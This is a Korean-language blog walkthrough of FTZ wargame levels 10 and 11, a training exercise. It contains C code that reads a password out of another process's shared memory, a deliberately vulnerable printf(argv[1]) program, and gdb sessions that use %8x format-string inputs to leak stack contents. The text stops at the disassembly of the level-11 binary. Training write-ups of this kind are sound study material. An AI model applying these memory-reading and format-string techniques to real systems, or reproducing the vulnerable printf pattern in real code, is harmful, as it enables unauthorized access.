---
layout: article
title: "[System]System hacking(2)"
key: 19700101
tags:
  - System
  - Dev
  - Pwnable
toc: true
mathjax: true
mathjax_autoNumber: true
---

# [+] System Hacking(10~20)

<!--more-->

## [+] FTZ level10

### Analysis

공유 메모리에 관한 문제라고 한다.
공유 메모리 여러 개의 프로세스가 함께 사용하는 메모리를 의미한다. 이 공유 메모리를 이용해 프로세스 간 통신이 가능하다. 참고로 프로세스 간 통신(IPC)를 이용하는 방법으로는 공유 메모리 외에 메시지 큐, 세마포어가 존재한다.

공유 메모리는 최초로 공유 메모리를 생성하는 프로세스에 의해서 생성되며 커널에서 관리하게 된다. 또한 한번 만들어진 메모리 공간은 프로세스가 사용하지 않는다고 사라지지 않고 직접 삭제 또는 리부팅 시에만 사라진다

공유 메모리가 사용되는 것을 확인하는 명령어는 `ipcs` 명령어이다.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024

int main()
{
        void *shM=(void *)0;
        int shMID;
        char buf[BUFFSIZE]="3456";
        key_t keyval =7777;

        shMID=shmget(keyval,BUFFSIZE,IPC_CREAT);
        printf("%d\n",shMID);
        shM=shmat(shMID,(void*)0,0);
        if(shM==(void*)-1)
                printf("Error!!\n");
        else
                memcpy(shM,buf,BUFFSIZE);
                printf("%s\n",shM);
        shmdt(shM); 
         
        return 0;
}
```

`shmget()` 함수를 이용해 공유 메모리를 생성하여 공유된 메모리의 ID 값을 반환하여 `shMID` 변수에 할당한다. `shmat()` 함수를 이용해 `shM` 변수에 메모리를 할당한다. `malloc` 함수와 유사하다.

그리고 `shmdt()`함수를 이용해 공유 메모리와 분리하고 종료한다.


```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define shmKey 7530
#define BUFFSIZE 1024

int main()
{
        int shMID;
        char buf[BUFFSIZE];
        void *shM;
        shMID=shmget(shmKey,BUFFSIZE,IPC_CREAT);
        if(shMID==-1){
                printf("Error shmget()\n");
                exit(0);
        }
        shM=shmat(shMID,(void *)0,0);
        if((void *)-1==shM){
                printf("Error shmat()\n");
                exit(0);
        }
    	memcpy(buf,shM,BUFFSIZE);
    	printf("%s\n",buf);
        //printf("%s\n",(char *)shM);
        shmdt(shM);
        return 0;
}
```

위와 같이 짜서 실행하면 패스워드가 출력된다.

공유 메모리 원리에 대해 좀더 알아보자

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024
#define shmkey 7777

int main()
{
        void *shM;
        int shMID;
        char buf[BUFFSIZE]="3456";

        shMID=shmget(shmkey,BUFFSIZE,IPC_CREAT|0666);
        shM=shmat(shMID,(void *)0,0);

        memcpy(shM,buf,BUFFSIZE);
        printf("%s\n",shM);

        shmdt(shM);
        return 0;
}
```

위는 공유 메모리를 생성하는 코드이다. 이제 저 프로그램을 공격하는 코드를 짜본다.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024
#define shmKey 7777

int main()
{
        void *shM;
        int shMID;
        char buf[BUFFSIZE];

        shMID=shmget(shmKey,BUFFSIZE,0666);
        if(shMID==-1){
                printf("Error shmget()!\n");
                exit(0);
        }
        shM=shmat(shMID,(void *)0,0);
        if(shM==(void *)-1){
                printf("Error shmat()!\n");
                exit();
        }
        memcpy(buf,shM,BUFFSIZE);
        if(strcmp(buf,"3456")==0)
                printf("key is %s\n",buf);
        else
                printf("invalid password\n");
        shmdt(shM);
        return 0;
}
```

```
[level10@ftz tmp]$ ./shm2
key is 3456
```

컴파일하여 실행하면 위와 같이 공유 메모리에 존재하는 문자열을 가져오는 것을 확인할 수 있다.



## [+] FTZ level11

### Analysis

먼저 간단한 포맷 스트링을 알아보자아

| 식별자 |  인수  |         출력         |
| :----: | :----: | :------------------: |
|   %x   |  int   |   부호 없는 16진수   |
|   %d   |  int   |   부호 있는 10진수   |
|   %o   |  int   |   부호 없는 8진수    |
|   %c   |  char  |         문자         |
|   %s   | char * |        문자열        |
|   %f   | double |         소수         |
|   %p   | void * | 변수의 주소1(16진수) |

포맷스트링에서 어떠한 취약점이 발생하는지 알아보기 위해 아래와 같은 소스를 이용한다.

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
        int value=10;
        char *hacker="hacker";
        char *super="Super";

        printf(argv[1]);
        printf("\n");
}
```

컴파일 시 `gcc -mpreferred-stack-boundary=2 <c source file>` 으로 옵션을 추가해 더미를 제거한다.

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x08048328 <main+0>:	push   %ebp
0x08048329 <main+1>:	mov    %esp,%ebp
0x0804832b <main+3>:	sub    $0xc,%esp
0x0804832e <main+6>:	movl   $0xa,0xfffffffc(%ebp)
0x08048335 <main+13>:	movl   $0x8048410,0xfffffff8(%ebp)
0x0804833c <main+20>:	movl   $0x8048417,0xfffffff4(%ebp)
0x08048343 <main+27>:	mov    0xc(%ebp),%eax
0x08048346 <main+30>:	add    $0x4,%eax
0x08048349 <main+33>:	pushl  (%eax)
0x0804834b <main+35>:	call   0x8048268 <printf>
0x08048350 <main+40>:	add    $0x4,%esp
0x08048353 <main+43>:	push   $0x804841d
0x08048358 <main+48>:	call   0x8048268 <printf>
0x0804835d <main+53>:	add    $0x4,%esp
0x08048360 <main+56>:	leave  
0x08048361 <main+57>:	ret    
0x08048362 <main+58>:	nop    
0x08048363 <main+59>:	nop    
End of assembler dump.
```

해당 디스어셈블 코드이다. 자 포맷스트링을 통해 일어나는 취약점을 확인해본다.

`printf(argv[1])` 으로 실행 시 전달받은 인자를 출력하게 되는데 포맷스트링을 사용하지 않고 이런식의 코딩은 매우 위험하다.

```bash
Starting program: /home/level11/tmp/a.out "%8x %8x %8x %8x %8x %8x %8x %8x"

Breakpoint 1, 0x0804834b in main ()
(gdb) x/9x $esp
0xbffff6a8:	0xbffffc19	0x08048417	0x08048410	0x0000000a
0xbffff6b8:	0xbffff6d8	0x42015574	0x00000002	0xbffff704
0xbffff6c8:	0xbffff710
(gdb) x/s 0xbffffc19
0xbffffc19:	 "%8x %8x %8x %8x %8x %8x %8x %8x"
(gdb) x/s 0x8048417
0x8048417 <_IO_stdin_used+11>:	 "Super"
(gdb) x/s 0x8048410
0x8048410 <_IO_stdin_used+4>:	 "hacker"
(gdb) x/d 0xbffff6b4
0xbffff6b4:	10
(gdb) x/x 0xbffff6d8 
0xbffff6d8:	0x00000000
(gdb) x/x 0x42015574
0x42015574 <__libc_start_main+228>:	0x58ebc189
(gdb) x/d 0xbffff6c0
0xbffff6c0:	2
(gdb) x/x 0xbffff704 
0xbffff704:	0xbffffc01
(gdb) x/2s 0xbffffc01
0xbffffc01:	 "/home/level11/tmp/a.out"
0xbffffc19:	 "%8x %8x %8x %8x %8x %8x %8x %8x"
(gdb) x/x 0xbffff710
0xbffff710:	0xbffffc39
(gdb) x/16s 0xbffffc39
0xbffffc39:	 "HOSTNAME=ftz.hackerschool.org"
0xbffffc57:	 "SHELL=/bin/bash"
0xbffffc67:	 "TERM=xterm"
0xbffffc72:	 "HISTSIZE=1000"
0xbffffc80:	 "SSH_CLIENT=192.168.64.1 2346 22"
0xbffffca0:	 "SSH_TTY=/dev/pts/0"
0xbffffcb3:	 "USER=level11"
0xbffffcc0:	 "LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=00;32:*.cmd=00;32:*.exe=00;32:*.com=00;32:*.btm=00;32:*.bat=00;32:*.sh=00;32:*.csh=00"...
0xbffffd88:	 ";32:*.tar=00;31:*.tgz=00;31:*.arj=00;31:*.taz=00;31:*.lzh=00;31:*.zip=00;31:*.z=00;31:*.Z=00;31:*.gz=00;31:*.bz2=00;31:*.bz=00;31:*.tz=00;31:*.rpm=00;31:*.cpio=00;31:*.jpg=00;35:*.gif=00;35:*.bmp=00;3"...
0xbffffe50:	 "5:*.xbm=00;35:*.xpm=00;35:*.png=00;35:*.tif=00;35:"
0xbffffe83:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/level11/bin"
0xbffffec6:	 "MAIL=/var/spool/mail/level11"
0xbffffee3:	 "PWD=/home/level11/tmp"
0xbffffef9:	 "INPUTRC=/etc/inputrc"
0xbfffff0e:	 "LANG=en_US.UTF-8"
0xbfffff1f:	 "PS1=[\\u@\\h \\W]$ "
(gdb) 
```

자세히 잘봐야한다; 

| *super(0xbffff6ac) | *hacker(0xbffff6b0) | int a(0xbffff6b4) | SFP  | RET(0xbffff6bc) | argc | argv | env      |
| :----------------: | ------------------- | ----------------- | ---- | --------------- | ---- | ---- | -------- |
|     0x08048417     | 0x08048410          | 0x0000000a        |      | 0x42015574      | 2    | 명령 | 환경변수 |

이런 식으로 스택이 구성되있다.
`$esp` 내 존재하는 `%8x %8x %8x ...` 의 경우는 `printf` 함수 호출 전 푸시되어 있는 것이다.

그럼 잘 생각해보면 `*super-4` 만큼에 `printf` 인자를 전달하고 해당 주소에서 -4만큼 가면  복귀주소가 존재할 것이다.

요롷게 스택은 확인을하고.. 바로 해당 레벨 풀이를 해본다.



```bash
[level11@ftz level11]$ gdb ./attackme -q
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   %ebp
0x08048471 <main+1>:	mov    %esp,%ebp
0x08048473 <main+3>:	sub    $0x108,%esp
0x08048479 <main+9>:	sub    $0x8,%esp
0x0804847c <main+12>:	push   $0xc14
0x08048481 <main+17>:	push   $0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
0x0804848b <main+27>:	add    $0x10,%esp
0x0804848e <main+30>:	sub    $0x8,%esp
0x08048491 <main+33>:	mov    0xc(%ebp),%eax
0x08048494 <main+36>:	add    $0x4,%eax
0x08048497 <main+39>:	pushl  (%eax)
0x08048499 <main+41>:	lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:	push   %eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>
0x080484a5 <main+53>:	add    $0x10,%esp
0x080484a8 <main+56>:	sub    $0xc,%esp
0x080484ab <main+59>:	lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:	push   %eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    $0x10,%esp
0x080484ba <main+74>:	leave  
0x080484bb <main+75>:	ret    
0x080484bc <main+76>:	nop    
0x080484bd <main+77>:	nop    
0x080484be <main+78>:	nop    
0x080484bf <main+79>:	nop    
End of assembler dump.
(gdb)
```

위에서 예시를 이용해 스택을 확인한 것 처럼 문제 역시 동일하게 한번 확인한다. 

